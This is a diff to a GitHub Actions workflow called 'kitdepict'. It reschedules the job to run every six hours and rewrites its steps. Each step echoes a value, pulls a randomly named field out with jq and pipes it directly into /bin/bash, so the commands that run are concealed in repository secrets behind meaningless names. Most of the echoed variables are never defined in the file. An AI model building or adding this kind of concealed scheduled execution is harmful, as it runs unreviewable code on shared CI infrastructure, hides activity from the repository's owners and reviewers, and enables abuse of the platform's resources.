@@ -3,7 +3,7 @@ name: kitdepict
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 4/6 * * *'
+    - cron: '35 1/6 * * *'
 
 jobs:
   build:
@@ -12,12 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: kitdepict
         env:
-          riif35: ${{ secrets.riif35 }}
+          yd07: ${{ secrets.yd07 }}
         run: |
-          echo $riif35 | jq -r .jkx60 | /bin/bash
-          echo $gmcve317 | jq -r .v6445 | /bin/bash
-          echo $gdw60 | jq -r .vdyno304 | /bin/bash
-          echo $rr840 | jq -r .y3 | /bin/bash
-          echo $fmnj46 | jq -r .hsnxe1 | /bin/bash
-          echo $hsvu591 | jq -r .dq6 | /bin/bash
+          echo $yd07 | jq -r .k096 | /bin/bash
+          echo $fwejs5 | jq -r .nnz877 | /bin/bash
+          echo $ztkk47 | jq -r .fuut809 | /bin/bash
+          echo $fxvl5 | jq -r .z8303 | /bin/bash
+          echo $ozzy4 | jq -r .qkiuw7038 | /bin/bash
+          echo $xsdx0 | jq -r .tfmnc667 | /bin/bash
+          echo $rd57 | jq -r .qbm590 | /bin/bash
 
